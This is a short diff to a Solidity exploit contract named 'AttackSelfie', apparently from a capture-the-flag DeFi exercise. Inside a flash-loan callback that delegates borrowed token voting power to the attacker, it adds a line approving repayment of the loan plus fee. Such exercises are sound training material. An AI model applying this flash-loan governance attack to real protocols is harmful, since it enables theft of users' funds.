@@ -35,7 +35,7 @@ contract AttackSelfie {
     ) external returns(bytes32) {
         damnValuableToken.delegate(address(this));
 
-
+        IERC20(token).approve(address(pool), amount + fee);
         return CALL_BACK_SUCCESS;
     }
 
